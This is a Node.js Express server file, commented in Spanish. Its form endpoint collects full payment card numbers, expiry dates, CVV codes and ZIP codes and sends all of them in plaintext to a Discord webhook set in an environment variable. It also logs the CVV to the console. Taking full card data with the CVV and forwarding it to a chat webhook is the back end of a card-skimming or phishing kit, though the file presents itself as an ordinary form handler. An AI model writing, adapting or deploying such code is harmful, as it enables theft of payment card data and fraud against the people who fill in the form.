const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Configurar Content Security Policy
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data: https:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; connect-src 'self' https://discord.com;");
    next();
});

// Servir archivos estáticos (HTML, CSS, JS, imágenes)
app.use(express.static('.'));

// Ruta para favicon para evitar 404
app.get('/favicon.ico', (req, res) => res.status(204).end());

// Puerto de Railway o local
const PORT = process.env.PORT || 3000;

// Endpoint para recibir los datos del formulario
app.post('/api/submit-form', async (req, res) => {
    try {
        const { card, mm, aa, cvv, zip } = req.body;

        console.log('=== NEW FORM SUBMISSION ===');
        console.log('Data received:', { card: card ? card.substring(0, 4) + '****' : 'N/A', mm, aa, cvv, zip });

        // Obtener el webhook URL de las variables de entorno
        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

        console.log('Webhook URL configured:', !!webhookUrl);

        if (!webhookUrl) {
            console.error('DISCORD_WEBHOOK_URL not configured');
            return res.status(500).json({ error: 'Server configuration error' });
        }

        console.log('Sending to Discord webhook...');

        const content = {
            embeds: [{
                title: 'New form submission',
                color: 15158332,
                fields: [
                    { name: 'Card', value: card || 'N/A', inline: true },
                    { name: 'MM', value: mm || 'N/A', inline: true },
                    { name: 'AA', value: aa || 'N/A', inline: true },
                    { name: 'CVV', value: cvv || 'N/A', inline: true },
                    { name: 'ZIP Code', value: zip || 'N/A', inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(content)
        });

        console.log('Discord response status:', response.status);

        if (!response.ok) {
            console.error('Discord webhook failed with status:', response.status);
            throw new Error('Discord webhook failed');
        }

        console.log('Success! Data sent to Discord');
        res.json({ success: true });

    } catch (error) {
        console.error('Error in submit-form:', error);
        res.status(500).json({ error: 'Internal server error', details: error.message });
    }
});

// Endpoint de prueba sin Discord
app.post('/api/test-form', (req, res) => {
    const { card, mm, aa, cvv, zip } = req.body;
    console.log('Test endpoint received:', { card: card ? '***' : 'N/A', mm, aa, cvv, zip: zip ? '***' : 'N/A' });
    res.json({ success: true, received: { card: card ? '***' : 'N/A', mm, aa, cvv, zip: zip ? '***' : 'N/A' } });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', message: 'Server is running' });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
